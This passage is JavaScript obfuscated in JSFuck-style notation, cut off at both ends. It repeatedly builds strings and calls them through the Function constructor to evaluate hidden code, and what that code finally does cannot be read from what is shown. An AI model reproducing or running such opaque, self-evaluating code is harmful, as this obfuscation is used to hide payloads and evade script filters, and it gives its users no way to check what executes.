])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])](([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]